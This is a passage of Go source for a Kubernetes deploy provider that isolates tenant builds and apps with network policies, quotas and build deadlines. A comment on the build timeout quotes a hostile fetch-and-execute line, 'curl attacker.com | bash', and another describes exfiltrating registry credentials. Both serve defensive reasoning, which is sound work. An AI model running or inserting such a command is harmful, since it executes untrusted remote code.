func (p *K8sProvider) createBuildNetworkPolicy(ctx context.Context, ns string) error {
	proto53UDP := corev1.ProtocolUDP
	proto53TCP := corev1.ProtocolTCP
	port53 := intstr.FromInt(53)

	np := &networkingv1.NetworkPolicy{
		ObjectMeta: metav1.ObjectMeta{
			Name:      buildNetworkPolicyName,
			Namespace: ns,
			Labels: map[string]string{
				"managed-by":            "instant.dev",
				"instant.dev/component": "build-staging",
			},
		},
		Spec: networkingv1.NetworkPolicySpec{
			// Select every pod in the build namespace.
			PodSelector: metav1.LabelSelector{},
			PolicyTypes: []networkingv1.PolicyType{
				networkingv1.PolicyTypeIngress,
				networkingv1.PolicyTypeEgress,
			},
			// Ingress: fully denied — a kaniko build pod is never a server.
			Ingress: []networkingv1.NetworkPolicyIngressRule{},
			Egress: []networkingv1.NetworkPolicyEgressRule{
				{
					// DNS resolution via kube-dns (UDP + TCP port 53).
					To: []networkingv1.NetworkPolicyPeer{
						{
							NamespaceSelector: &metav1.LabelSelector{
								MatchLabels: map[string]string{
									"kubernetes.io/metadata.name": "kube-system",
								},
							},
						},
					},
					Ports: []networkingv1.NetworkPolicyPort{
						{Protocol: &proto53UDP, Port: &port53},
						{Protocol: &proto53TCP, Port: &port53},
					},
				},
				{
					// In-cluster object store (MinIO in instant-data) — the
					// kaniko init-container fetches the presigned build context.
					To: []networkingv1.NetworkPolicyPeer{
						{
							NamespaceSelector: &metav1.LabelSelector{
								MatchLabels: map[string]string{
									"kubernetes.io/metadata.name": dataNamespaceName,
								},
							},
						},
					},
					Ports: []networkingv1.NetworkPolicyPort{
						{Protocol: ptrProto(corev1.ProtocolTCP), Port: ptrPort(objectStorePort)},
					},
				},
				{
					// External internet on HTTP(S) — kaniko pushes the built
					// image to the registry (GHCR) and may fetch an external
					// build context. Cluster pod/service CIDRs + the cloud
					// metadata link-local range are in the Except list, so this
					// rule cannot reach other tenants' pods, the kube-apiserver,
					// or 169.254.169.254.
					To: []networkingv1.NetworkPolicyPeer{
						{
							IPBlock: &networkingv1.IPBlock{
								CIDR:   "0.0.0.0/0",
								Except: egressExceptCIDRs(),
							},
						},
					},
					Ports: []networkingv1.NetworkPolicyPort{
						{Protocol: ptrProto(corev1.ProtocolTCP), Port: ptrPort(httpsPort)},
						{Protocol: ptrProto(corev1.ProtocolTCP), Port: ptrPort(httpPort)},
					},
				},
			},
		},
	}
	if err := p.upsertNetworkPolicy(ctx, ns, np); err != nil {
		return fmt.Errorf("create build network policy in %q: %w", ns, err)
	}
	return nil
}

// createDefaultDenyNetworkPolicy is a backward-compat shim over createNetworkPolicyInNS.
// The teamID is empty here — this shim is only called by legacy code paths
// that have not yet been updated to pass a team ID.
func (p *K8sProvider) createDefaultDenyNetworkPolicy(ctx context.Context, appID string) error {
	return p.createNetworkPolicyInNS(ctx, deployNamespace(appID), "")
}

// createResourceQuotaInNS installs a ResourceQuota in the given namespace.
// Limits include headroom (~256Mi + 1 pod) for cert-manager HTTP-01 ACME
// solver pods that spawn briefly when issuing/renewing TLS certs.
//   - hobby: 512Mi RAM, 500m CPU, 6 pods max
//   - pro:   1Gi RAM,   1 CPU,    11 pods max
//   - team:  3Gi RAM,   3 CPU,    21 pods max
func (p *K8sProvider) createResourceQuotaInNS(ctx context.Context, ns, tier string) error {
	var memLimit, cpuLimit string
	var maxPods string
	switch tier {
	case "pro":
		memLimit = "1Gi"
		cpuLimit = "1"
		maxPods = "11"
	case "team":
		memLimit = "3Gi"
		cpuLimit = "3"
		maxPods = "21"
	default: // hobby + anonymous
		memLimit = "512Mi"
		cpuLimit = "500m"
		maxPods = "6"
	}

	quota := &corev1.ResourceQuota{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "instant-quota",
			Namespace: ns,
		},
		Spec: corev1.ResourceQuotaSpec{
			Hard: corev1.ResourceList{
				corev1.ResourceRequestsMemory: resource.MustParse(memLimit),
				corev1.ResourceLimitsMemory:   resource.MustParse(memLimit),
				corev1.ResourceRequestsCPU:    resource.MustParse(cpuLimit),
				corev1.ResourceLimitsCPU:      resource.MustParse(cpuLimit),
				corev1.ResourcePods:           resource.MustParse(maxPods),
			},
		},
	}
	_, err := p.clientset.CoreV1().ResourceQuotas(ns).Create(ctx, quota, metav1.CreateOptions{})
	if err != nil && !apierrors.IsAlreadyExists(err) {
		return fmt.Errorf("create resource quota in %q: %w", ns, err)
	}
	return nil
}

// createResourceQuota is a backward-compat shim over createResourceQuotaInNS.
func (p *K8sProvider) createResourceQuota(ctx context.Context, appID, tier string) error {
	return p.createResourceQuotaInNS(ctx, deployNamespace(appID), tier)
}

// createLimitRangeForNS installs per-container default resource requests/limits
// in the given namespace so pods without explicit resources get sensible defaults.
//
// Gap 1 fix (disk fill / noisy-neighbour DoS): the LimitRange includes
// ephemeral-storage default + defaultRequest so that any customer container
// that does NOT set explicit resources (or whose Deployment falls through the
// applyDeploymentInNS path) still gets a storage cap. This is a defence-in-
// depth backstop; applyDeploymentInNS and createStackDeployment ALSO set
// explicit ephemeral-storage on every container spec.
//
// NOTE — per-pod PID limiting (fork-bomb defence):
// Kubernetes does NOT support "pids" as a LimitRange resource. Attempts to add
// it are rejected by the API server with:
//
//	"pids: must be a standard resource for containers"
//
// This was verified in production (DOKS 1.32). The previous code attempted a
// try-with-pids / fallback pattern, but the fallback always fired, making the
// pids branch permanently dead code.
//
// Kubernetes per-pod PID limiting requires a node-level kubelet configuration:
//
//	--pod-max-pids / podPidsLimit (kubelet config or DOKS node-pool kubelet arg).
//
// This is an operator/infrastructure action, not something the API server or a
// LimitRange can enforce per-namespace. The practical risk is contained: the
// per-pod memory limit (256Mi for hobby) OOM-backstops naive fork bombs because
// spawning thousands of processes consumes memory. A dedicated PID cap requires
// a DOKS node-pool kubelet customization if the threat model warrants it.
func (p *K8sProvider) createLimitRangeForNS(ctx context.Context, ns, tier string) error {
	memReq, memLimit, cpuReq := compute.TierResources(tier)
	ephReq, ephLimit := compute.TierEphemeralStorage(tier)

	lr := &corev1.LimitRange{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "instant-limits",
			Namespace: ns,
		},
		Spec: corev1.LimitRangeSpec{
			Limits: []corev1.LimitRangeItem{
				{
					Type: corev1.LimitTypeContainer,
					Default: corev1.ResourceList{
						corev1.ResourceMemory:           resource.MustParse(memLimit),
						corev1.ResourceCPU:              resource.MustParse(cpuReq),
						corev1.ResourceEphemeralStorage: resource.MustParse(ephLimit),
					},
					DefaultRequest: corev1.ResourceList{
						corev1.ResourceMemory:           resource.MustParse(memReq),
						corev1.ResourceCPU:              resource.MustParse(cpuReq),
						corev1.ResourceEphemeralStorage: resource.MustParse(ephReq),
					},
				},
			},
		},
	}

	_, err := p.clientset.CoreV1().LimitRanges(ns).Create(ctx, lr, metav1.CreateOptions{})
	if err != nil && !apierrors.IsAlreadyExists(err) {
		return fmt.Errorf("create limit range in %q: %w", ns, err)
	}
	return nil
}

// createLimitRangeInNS is a backward-compat shim over createLimitRangeForNS.
func (p *K8sProvider) createLimitRangeInNS(ctx context.Context, appID, tier string) error {
	return p.createLimitRangeForNS(ctx, deployNamespace(appID), tier)
}

// teardownDeployNamespace deletes the entire per-deployment namespace and all
// resources inside it. Best-effort: logs errors but does not return them.
func (p *K8sProvider) teardownDeployNamespace(ctx context.Context, appID string) error {
	ns := deployNamespace(appID)
	err := p.clientset.CoreV1().Namespaces().Delete(ctx, ns, metav1.DeleteOptions{})
	if err != nil && !apierrors.IsNotFound(err) {
		return fmt.Errorf("delete namespace %q: %w", ns, err)
	}
	return nil
}

// Deploy builds the container image from the tarball, creates the per-deployment
// namespace with security primitives, then creates the Deployment and Service.
// Returns immediately with Status="building"; caller polls Status().
func (p *K8sProvider) Deploy(ctx context.Context, opts compute.DeployOptions) (*compute.AppDeployment, error) {
	if opts.Port == 0 {
		opts.Port = 8080
	}

	imageTag := imageName(opts.AppID)
	ns := deployNamespace(opts.AppID)

	// Step 1: Build the Docker image from the tarball.
	if err := p.buildImage(ctx, deployNamespace(opts.AppID), opts.AppID, imageTag, opts.Tarball); err != nil {
		return nil, fmt.Errorf("k8s.Deploy: build image: %w", err)
	}

	// Step 2: Create per-deployment namespace with all security primitives.
	// opts.TeamID scopes the NetworkPolicy DB-egress rule to this team's
	// customer-resource namespaces — preventing cross-tenant DB access.
	if err := p.setupTenantNamespace(ctx, ns, opts.AppID, opts.TeamID, opts.Tier); err != nil {
		return nil, fmt.Errorf("k8s.Deploy: setup namespace: %w", err)
	}

	deployName := deploymentName(opts.AppID)
	svcName := serviceName(opts.AppID)

	memReq, memLimit, cpuReq := compute.TierResources(opts.Tier)
	ephReq, ephLimit := compute.TierEphemeralStorage(opts.Tier)

	// Step 6: Create Deployment in the per-deployment namespace.
	if err := p.applyDeploymentInNS(ctx, ns, deployName, imageTag, opts.EnvVars, opts.Port, memReq, memLimit, cpuReq, ephReq, ephLimit); err != nil {
		return nil, fmt.Errorf("k8s.Deploy: apply deployment: %w", err)
	}

	// Step 7: Create Service (NodePort) in the per-deployment namespace.
	nodePort, err := p.applyServiceInNS(ctx, ns, svcName, deployName, opts.AppID, opts.Port)
	if err != nil {
		return nil, fmt.Errorf("k8s.Deploy: apply service: %w", err)
	}

	// Step 8: Create Ingress (+ cert-manager TLS) when DEPLOY_DOMAIN is set.
	// Falls back to the NodePort URL on local clusters that don't have an
	// ingress controller or public domain configured. When opts.Private is
	// true, the Ingress carries an nginx whitelist-source-range annotation
	// built from opts.AllowedIPs — see applyIngressForDeploy for the precise
	// annotation key and how it's joined.
	ingressURL, err := p.applyIngressForDeploy(ctx, ns, svcName, opts.AppID, opts.Port, opts.Private, opts.AllowedIPs)
	if err != nil {
		return nil, fmt.Errorf("k8s.Deploy: apply ingress: %w", err)
	}

	publicURL := ingressURL
	if publicURL == "" {
		publicURL = appURL(nodePort)
	}

	slog.Info("k8s.Deploy: deployment created",
		"app_id", opts.AppID,
		"image", imageTag,
		"namespace", ns,
		"node_port", nodePort,
		"ingress_url", ingressURL,
		"url", publicURL,
	)

	return &compute.AppDeployment{
		ProviderID: deployName,
		AppURL:     publicURL,
		Status:     "building",
		UpdatedAt:  time.Now(),
	}, nil
}

// Status returns the current deployment state by inspecting Deployment conditions
// and AvailableReplicas in the per-deployment namespace.
func (p *K8sProvider) Status(ctx context.Context, providerID string) (*compute.AppDeployment, error) {
	appID := appIDFromDeployName(providerID)
	ns := deployNamespace(appID)

	deploy, err := p.clientset.AppsV1().Deployments(ns).Get(ctx, providerID, metav1.GetOptions{})
	if err != nil {
		if apierrors.IsNotFound(err) {
			return &compute.AppDeployment{
				ProviderID: providerID,
				AppURL:     "",
				Status:     "stopped",
				UpdatedAt:  time.Now(),
			}, nil
		}
		return nil, fmt.Errorf("k8s.Status: get deployment %q in %q: %w", providerID, ns, err)
	}

	status := deploymentStatus(deploy)

	// Resolve the NodePort from the associated Service.
	svcName := serviceName(appID)
	nodePort := 0
	svc, err := p.clientset.CoreV1().Services(ns).Get(ctx, svcName, metav1.GetOptions{})
	if err == nil && len(svc.Spec.Ports) > 0 {
		nodePort = int(svc.Spec.Ports[0].NodePort)
	}

	// Prefer the public Ingress URL when DEPLOY_DOMAIN is configured; fall
	// back to the NodePort URL for local dev.
	publicURL := deployIngressURL(appID)
	if publicURL == "" {
		publicURL = appURL(nodePort)
	}

	return &compute.AppDeployment{
		ProviderID: providerID,
		AppURL:     publicURL,
		Status:     status,
		UpdatedAt:  deploy.CreationTimestamp.Time,
	}, nil
}

// Logs returns a ReadCloser that streams pod logs for the given deployment.
// follow=true tails the stream; follow=false returns the current buffer.
func (p *K8sProvider) Logs(ctx context.Context, providerID string, follow bool) (io.ReadCloser, error) {
	appID := appIDFromDeployName(providerID)
	ns := deployNamespace(appID)

	// Find the first running pod for this deployment.
	pods, err := p.clientset.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{
		LabelSelector: fmt.Sprintf("%s=%s", labelAppID, appID),
	})
	if err != nil {
		return nil, fmt.Errorf("k8s.Logs: list pods for %q in %q: %w", providerID, ns, err)
	}
	if len(pods.Items) == 0 {
		return io.NopCloser(strings.NewReader("no pods found")), nil
	}

	podName := pods.Items[0].Name
	req := p.clientset.CoreV1().Pods(ns).GetLogs(podName, &corev1.PodLogOptions{
		Follow:    follow,
		TailLines: int64Ptr(200),
	})
	stream, err := req.Stream(ctx)
	if err != nil {
		return nil, fmt.Errorf("k8s.Logs: stream logs for pod %q: %w", podName, err)
	}
	return stream, nil
}

// buildLogMaxLines is the cap on tailed kaniko log lines for the autopsy.
const buildLogMaxLines = 200

// FetchBuildLogs implements compute.BuildLogFetcher.
//
// P1-G: it first consults buildLogCache, which buildImage populates with a
// snapshot of the kaniko pod logs the instant a build fails — before the
// 300s Job TTL can reap the pod. A cache hit is always returned because it
// is the only source that survives the TTL race. On a cache miss (e.g. the
// autopsy ran fast, or this is a fresh api pod) it falls back to reading the
// live pod logs, locating the kaniko build pod for appID (job label
// "job-name=build-<appID>" in namespace "instant-deploy-<appID>").
//
// Fail-soft contract: any error (pod gone, namespace deleted, logs unavailable)
// is returned as (nil, err) so the caller writes the autopsy row with an empty
// last_lines slice rather than panicking or blocking.
func (p *K8sProvider) FetchBuildLogs(ctx context.Context, appID string) ([]string, error) {
	// Cache hit — the snapshot captured at failure time. Authoritative.
	if v, ok := p.buildLogCache.Load(appID); ok {
		if entry, ok := v.(*buildLogCacheEntry); ok {
			if time.Since(entry.capturedAt) <= buildLogCacheTTL {
				return entry.lines, nil
			}
			// Stale — drop it and fall through to a live read.
			p.buildLogCache.Delete(appID)
		}
	}

	ns := deployNamespace(appID)
	jobName := "build-" + sanitizeName(appID)
	lines, err := p.streamKanikoLogs(ctx, ns, jobName)
	if err != nil {
		return nil, fmt.Errorf("k8s.FetchBuildLogs: %w", err)
	}
	return lines, nil
}

// snapshotBuildLogs reads the kaniko pod logs for a just-failed build and
// stores them in buildLogCache keyed by appID. Called from buildImage the
// moment waitForJobComplete reports failure, while the pod is still alive.
// Best-effort: a read failure here just means FetchBuildLogs falls back to a
// (likely doomed) live read — strictly no worse than the pre-P1-G behaviour.
//
// It also opportunistically evicts cache entries older than buildLogCacheTTL
// so a long-lived api pod does not accumulate snapshots indefinitely.
func (p *K8sProvider) snapshotBuildLogs(ctx context.Context, ns, appID, jobName string) {
	p.evictStaleBuildLogs()

	lines, err := p.streamKanikoLogs(ctx, ns, jobName)
	if err != nil {
		slog.Warn("k8s.snapshotBuildLogs: could not capture failed build logs",
			"app_id", appID, "job", jobName, "error", err)
		return
	}
	p.buildLogCache.Store(appID, &buildLogCacheEntry{
		lines:      lines,
		capturedAt: time.Now(),
	})
	slog.Info("k8s.snapshotBuildLogs: captured failed build logs for autopsy",
		"app_id", appID, "lines", len(lines))
}

// evictStaleBuildLogs drops buildLogCache entries older than buildLogCacheTTL.
func (p *K8sProvider) evictStaleBuildLogs() {
	now := time.Now()
	p.buildLogCache.Range(func(k, v any) bool {
		if entry, ok := v.(*buildLogCacheEntry); ok && now.Sub(entry.capturedAt) > buildLogCacheTTL {
			p.buildLogCache.Delete(k)
		}
		return true
	})
}

// streamKanikoLogs locates the kaniko build pod for jobName in ns, streams its
// "kaniko" container stdout, and returns the last ≤buildLogMaxLines lines with
// null bytes stripped. Shared by FetchBuildLogs (live read) and
// snapshotBuildLogs (capture-at-failure).
func (p *K8sProvider) streamKanikoLogs(ctx context.Context, ns, jobName string) ([]string, error) {
	pods, err := p.clientset.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{
		LabelSelector: "job-name=" + jobName,
	})
	if err != nil {
		return nil, fmt.Errorf("list pods for job %q in %q: %w", jobName, ns, err)
	}
	if len(pods.Items) == 0 {
		return nil, fmt.Errorf("no pods found for job %q in %q (pod may have been GC'd)", jobName, ns)
	}

	// Use the first pod (there is exactly one per build Job).
	podName := pods.Items[0].Name
	req := p.clientset.CoreV1().Pods(ns).GetLogs(podName, &corev1.PodLogOptions{
		Container: "kaniko",
		TailLines: int64Ptr(buildLogMaxLines),
	})
	stream, err := req.Stream(ctx)
	if err != nil {
		return nil, fmt.Errorf("stream logs for pod %q container kaniko: %w", podName, err)
	}
	defer stream.Close()

	var lines []string
	scanner := bufio.NewScanner(stream)
	for scanner.Scan() {
		line := strings.ReplaceAll(scanner.Text(), "\x00", "") // strip null bytes
		lines = append(lines, line)
	}
	if err := scanner.Err(); err != nil {
		// Partial logs are still better than none — return what we have.
		slog.Warn("k8s.streamKanikoLogs: scanner error reading kaniko logs",
			"pod", podName, "lines_so_far", len(lines), "error", err)
	}

	// Cap defensively (TailLines is advisory — some k8s implementations ignore it).
	if len(lines) > buildLogMaxLines {
		lines = lines[len(lines)-buildLogMaxLines:]
	}

	return lines, nil
}

// Teardown deletes the entire per-deployment namespace and all resources inside it.
func (p *K8sProvider) Teardown(ctx context.Context, providerID string) error {
	appID := appIDFromDeployName(providerID)

	if err := p.teardownDeployNamespace(ctx, appID); err != nil {
		return fmt.Errorf("k8s.Teardown: %w", err)
	}

	slog.Info("k8s.Teardown: deleted deployment namespace",
		"provider_id", providerID,
		"namespace", deployNamespace(appID),
	)
	return nil
}

// Redeploy builds a new image from the tarball and triggers a rolling update
// on the existing Deployment.
func (p *K8sProvider) Redeploy(ctx context.Context, providerID string, tarball []byte, envVars map[string]string) (*compute.AppDeployment, error) {
	appID := appIDFromDeployName(providerID)
	imageTag := imageName(appID)
	ns := deployNamespace(appID)

	if err := p.buildImage(ctx, deployNamespace(appID), appID, imageTag, tarball); err != nil {
		return nil, fmt.Errorf("k8s.Redeploy: build image: %w", err)
	}

	// Patch the Deployment to force a rollout (update an annotation).
	deploy, err := p.clientset.AppsV1().Deployments(ns).Get(ctx, providerID, metav1.GetOptions{})
	if err != nil {
		return nil, fmt.Errorf("k8s.Redeploy: get deployment %q in %q: %w", providerID, ns, err)
	}

	if deploy.Spec.Template.Annotations == nil {
		deploy.Spec.Template.Annotations = map[string]string{}
	}
	deploy.Spec.Template.Annotations["instant.dev/redeploy-at"] = time.Now().Format(time.RFC3339)

	// Update env vars if provided.
	if len(envVars) > 0 && len(deploy.Spec.Template.Spec.Containers) > 0 {
		deploy.Spec.Template.Spec.Containers[0].Env = envVarsToK8s(envVars)
	}

	_, err = p.clientset.AppsV1().Deployments(ns).Update(ctx, deploy, metav1.UpdateOptions{})
	if err != nil {
		return nil, fmt.Errorf("k8s.Redeploy: update deployment %q: %w", providerID, err)
	}

	// Resolve current NodePort.
	svcName := serviceName(appID)
	nodePort := 0
	svc, err := p.clientset.CoreV1().Services(ns).Get(ctx, svcName, metav1.GetOptions{})
	if err == nil && len(svc.Spec.Ports) > 0 {
		nodePort = int(svc.Spec.Ports[0].NodePort)
	}

	// Prefer the public Ingress URL when DEPLOY_DOMAIN is configured.
	publicURL := deployIngressURL(appID)
	if publicURL == "" {
		publicURL = appURL(nodePort)
	}

	slog.Info("k8s.Redeploy: rolling update triggered",
		"provider_id", providerID,
		"namespace", ns,
		"url", publicURL,
	)

	return &compute.AppDeployment{
		ProviderID: providerID,
		AppURL:     publicURL,
		Status:     "deploying",
		UpdatedAt:  time.Now(),
	}, nil
}

// buildImage builds the user's container image using kaniko inside k8s and
// pushes it to the configured registry. Works on any k8s cluster (containerd,
// docker, etc.) because the build runs as a Pod, not a subprocess on a node.
//
// Caller passes ns explicitly because the stack flow uses
// "instant-stack-<id>" while the single-app flow uses "instant-deploy-<id>".
func (p *K8sProvider) buildImage(ctx context.Context, ns, appID, imageTag string, tarball []byte) error {
	jobName := "build-" + sanitizeName(appID)
	ctxSecret := "build-ctx-" + sanitizeName(appID)
	authSecret := "ghcr-pull"

	slog.Info("k8s.buildImage: starting kaniko build",
		"app_id", appID, "image", imageTag, "namespace", ns)

	// 0. Ensure the namespace exists. The stack pipeline normally creates it
	//    via setupTenantNamespace AFTER the build step, so we need to be the
	//    first to bring it up. Idempotent.
	//
	//    SECURITY (P1-W3-19 / P1-W5-12): the PSS enforce/warn labels are stamped
	//    HERE — at namespace creation, before the kaniko Job — so the build pod
	//    (customer Dockerfile RUN steps, running as root) is governed by the
	//    baseline Pod Security Standard for the full build window, not only
	//    after setupTenantNamespace retrofits it post-build.
	nsObj := &corev1.Namespace{ObjectMeta: metav1.ObjectMeta{
		Name: ns,
		Labels: map[string]string{
			"managed-by":            "instant.dev",
			"instant.dev/component": "build-staging",
			pssEnforceLabel:         pssBaseline,
			pssWarnLabel:            pssRestricted,
		},
	}}
	if _, err := p.clientset.CoreV1().Namespaces().Create(ctx, nsObj, metav1.CreateOptions{}); err != nil {
		if !apierrors.IsAlreadyExists(err) {
			return fmt.Errorf("k8s.buildImage: ensure namespace %q: %w", ns, err)
		}
		// Namespace pre-exists (e.g. a retried build) — make sure the PSS labels
		// are present even if an older path created it without them.
		if uerr := p.upgradeNamespaceLabels(ctx, ns, nsObj.Labels); uerr != nil {
			return fmt.Errorf("k8s.buildImage: upgrade namespace labels %q: %w", ns, uerr)
		}
	}

	// 0b. Install the build-scoped default-deny NetworkPolicy BEFORE the kaniko
	//     Job is created. This closes the egress window in which the build pod
	//     could reach cloud metadata (169.254.169.254), the kube-apiserver, or
	//     other tenants' DB pods — and neuters the registry-credential-exfil
	//     vector (a build pod with no off-cluster egress except registry HTTPS
	//     cannot POST /kaniko/.docker/config.json to an attacker).
	if err := p.createBuildNetworkPolicy(ctx, ns); err != nil {
		return fmt.Errorf("k8s.buildImage: %w", err)
	}

	// 1. Tarball delivery. Prefer S3 when MinIO is configured (no 1 MiB cap);
	//    fall back to the legacy Secret path when not.
	s3URL, _, err := p.uploadBuildContext(ctx, appID, tarball)
	if err != nil {
		return fmt.Errorf("k8s.buildImage: upload build context: %w", err)
	}
	useSecret := s3URL == ""
	if useSecret {
		if err := p.upsertBuildContextSecret(ctx, ns, ctxSecret, tarball); err != nil {
			return fmt.Errorf("k8s.buildImage: build-context secret: %w", err)
		}
	}

	// 2. Ensure registry auth secret exists in this namespace (copied from instant ns).
	if err := p.ensureRegistryAuthInNS(ctx, ns, authSecret); err != nil {
		return fmt.Errorf("k8s.buildImage: registry auth: %w", err)
	}

	// 3. Create the kaniko Job (delete first if it exists from a previous attempt).
	prop := metav1.DeletePropagationBackground
	_ = p.clientset.BatchV1().Jobs(ns).Delete(ctx, jobName, metav1.DeleteOptions{
		PropagationPolicy: &prop,
	})
	if err := p.createKanikoJob(ctx, ns, jobName, ctxSecret, authSecret, imageTag, s3URL); err != nil {
		return fmt.Errorf("k8s.buildImage: create kaniko job: %w", err)
	}

	// 4. Wait for Job completion (poll status).
	if err := p.waitForJobComplete(ctx, ns, jobName, 10*time.Minute); err != nil {
		// P1-G: the kaniko Job + its pod are reaped 300s after the Job
		// terminates (TTLSecondsAfterFinished). The failure autopsy that
		// reads these logs runs LATER, in the api handler, after Deploy
		// returns — so on a slow path the pod is already gone and
		// failure.last_lines comes back empty. Snapshot the logs NOW, while
		// the failed pod is still guaranteed alive, into buildLogCache;
		// FetchBuildLogs serves the snapshot when the live pod is gone.
		p.snapshotBuildLogs(ctx, ns, appID, jobName)
		return fmt.Errorf("k8s.buildImage: kaniko job: %w", err)
	}

	slog.Info("k8s.buildImage: kaniko build complete", "app_id", appID, "image", imageTag)
	return nil
}

// sanitizeName lowercases and DNS-1123-cleans an appID for use in resource names.
func sanitizeName(s string) string {
	out := make([]byte, 0, len(s))
	for i := 0; i < len(s); i++ {
		c := s[i]
		switch {
		case c >= 'A' && c <= 'Z':
			out = append(out, c+32)
		case (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || c == '-':
			out = append(out, c)
		default:
			out = append(out, '-')
		}
	}
	return string(out)
}

// upsertBuildContextSecret writes the tarball into a Secret under key "context.tar.gz".
func (p *K8sProvider) upsertBuildContextSecret(ctx context.Context, ns, name string, tarball []byte) error {
	sec := &corev1.Secret{
		ObjectMeta: metav1.ObjectMeta{
			Name: name,
			Labels: map[string]string{
				"app.kubernetes.io/managed-by": "instant",
				"instant.dev/component":        "build-context",
			},
		},
		Data: map[string][]byte{"context.tar.gz": tarball},
		Type: corev1.SecretTypeOpaque,
	}
	_, err := p.clientset.CoreV1().Secrets(ns).Create(ctx, sec, metav1.CreateOptions{})
	if err == nil {
		return nil
	}
	if !apierrors.IsAlreadyExists(err) {
		return err
	}
	existing, err := p.clientset.CoreV1().Secrets(ns).Get(ctx, name, metav1.GetOptions{})
	if err != nil {
		return fmt.Errorf("get existing: %w", err)
	}
	existing.Data = sec.Data
	_, err = p.clientset.CoreV1().Secrets(ns).Update(ctx, existing, metav1.UpdateOptions{})
	return err
}

// ensureRegistryAuthInNS copies the dockerconfigjson auth secret from the
// "instant" namespace into the deploy namespace if missing.
func (p *K8sProvider) ensureRegistryAuthInNS(ctx context.Context, ns, name string) error {
	if _, err := p.clientset.CoreV1().Secrets(ns).Get(ctx, name, metav1.GetOptions{}); err == nil {
		return nil
	}
	src, err := p.clientset.CoreV1().Secrets("instant").Get(ctx, name, metav1.GetOptions{})
	if err != nil {
		return fmt.Errorf("source registry-auth secret %q in instant ns: %w", name, err)
	}
	dst := &corev1.Secret{
		ObjectMeta: metav1.ObjectMeta{Name: name},
		Type:       src.Type,
		Data:       src.Data,
	}
	_, err = p.clientset.CoreV1().Secrets(ns).Create(ctx, dst, metav1.CreateOptions{})
	if err != nil && !apierrors.IsAlreadyExists(err) {
		return err
	}
	return nil
}

// createKanikoJob spawns a one-shot Job that builds and pushes the image.
// When httpContextURL is non-empty an initContainer curls the build context
// from MinIO into a shared emptyDir; kaniko then reads via the standard
// tar:// path. When empty it falls back to a tar Secret mounted at /workspace.
//
// Why not --context=s3://: kaniko v1.23 ships AWS SDK v2 which only resolves
// S3 endpoints in vhost style; the path-style env switches are SDK v1 and
// silently ignored, so the bucket name resolves as a non-existent subdomain.
// Why not --context=https://: MinIO is plaintext HTTP in-cluster, kaniko's
// HTTP context list does not include http://. The init-container sidesteps
// both — we control the fetch, kaniko sees a local tar volume.
func (p *K8sProvider) createKanikoJob(ctx context.Context, ns, jobName, ctxSecret, authSecret, imageTag, httpContextURL string) error {
	backoff := int32(0)
	ttl := int32(300)

	useHTTP := httpContextURL != ""

	volumes := []corev1.Volume{{
		Name: "registry-auth",
		VolumeSource: corev1.VolumeSource{
			Secret: &corev1.SecretVolumeSource{
				SecretName: authSecret,
				Items: []corev1.KeyToPath{
					{Key: ".dockerconfigjson", Path: "config.json"},
				},
			},
		},
	}}
	mounts := []corev1.VolumeMount{
		{Name: "registry-auth", MountPath: "/kaniko/.docker"},
	}

	var initContainers []corev1.Container
	if useHTTP {
		// Shared emptyDir between init-container (curl) and main kaniko container.
		volumes = append(volumes, corev1.Volume{
			Name:         "build-context",
			VolumeSource: corev1.VolumeSource{EmptyDir: &corev1.EmptyDirVolumeSource{}},
		})
		mounts = append(mounts, corev1.VolumeMount{Name: "build-context", MountPath: "/workspace"})

		initContainers = []corev1.Container{{
			Name:    "fetch-context",
			Image:   "curlimages/curl:8.10.1",
			Command: []string{"sh", "-c", "curl --fail --silent --show-error --max-time 120 -o /workspace/context.tar.gz \"$URL\""},
			Env:     []corev1.EnvVar{{Name: "URL", Value: httpContextURL}},
			VolumeMounts: []corev1.VolumeMount{
				{Name: "build-context", MountPath: "/workspace"},
			},
			// Platform-owned image: apply full hardening including RunAsNonRoot
			// and ReadOnlyRootFilesystem (safe because curlimages/curl runs as
			// non-root and only writes to the declared /workspace volume).
			SecurityContext: platformContainerSecCtx(),
			Resources: corev1.ResourceRequirements{
				Requests: corev1.ResourceList{
					corev1.ResourceCPU:    resource.MustParse("50m"),
					corev1.ResourceMemory: resource.MustParse("32Mi"),
				},
				Limits: corev1.ResourceList{
					corev1.ResourceCPU:    resource.MustParse("250m"),
					corev1.ResourceMemory: resource.MustParse("64Mi"),
				},
			},
		}}
	} else {
		// Legacy Secret path (≤1 MiB).
		volumes = append(volumes, corev1.Volume{
			Name: "build-context",
			VolumeSource: corev1.VolumeSource{
				Secret: &corev1.SecretVolumeSource{SecretName: ctxSecret},
			},
		})
		mounts = append(mounts, corev1.VolumeMount{Name: "build-context", MountPath: "/workspace"})
	}

	job := &batchv1.Job{
		ObjectMeta: metav1.ObjectMeta{
			Name: jobName,
			Labels: map[string]string{
				"app.kubernetes.io/managed-by": "instant",
				"instant.dev/component":        "build",
			},
		},
		Spec: batchv1.JobSpec{
			BackoffLimit:            &backoff,
			TTLSecondsAfterFinished: &ttl,
			// Gap 2 fix (build pod timeout): cap the wall-clock time a Kaniko
			// build Job may run. A malicious or pathological Dockerfile (e.g.
			// RUN curl attacker.com | bash; sleep 1e9) would otherwise hold a
			// build slot forever. k8s kills the pod and marks the Job Failed
			// when the deadline fires — the caller's waitForJobComplete sees the
			// Failed condition and returns an error to the handler.
			ActiveDeadlineSeconds: func() *int64 { v := buildJobActiveDeadlineSecs; return &v }(),
			Template: corev1.PodTemplateSpec{
				Spec: corev1.PodSpec{
					RestartPolicy: corev1.RestartPolicyNever,
					// Platform-owned build pod: apply seccomp RuntimeDefault.
					// RunAsNonRoot is NOT set here because kaniko v1.23 needs
					// to run as root inside the build sandbox. It does not
					// set SUID binaries or escalate; AllowPrivilegeEscalation=false
					// in the container SecurityContext is sufficient.
					SecurityContext: platformPodSecCtx(),
					InitContainers:  initContainers,
					Containers: []corev1.Container{{
						Name:  "kaniko",
						Image: "gcr.io/kaniko-project/executor:v1.23.2",
						Args: []string{
							"--context=tar:///workspace/context.tar.gz",
							"--destination=" + imageTag,
							"--snapshot-mode=redo",
							"--cache=false",
							"--single-snapshot",
							"--cleanup",
						},
						// Explicit resources override the per-namespace LimitRange
						// default (hobby tier defaults to 50m/256Mi which throttles
						// kaniko + npm install to 5+ minutes). 250m/512Mi keeps a
						// medium npm install under a minute without inflating the
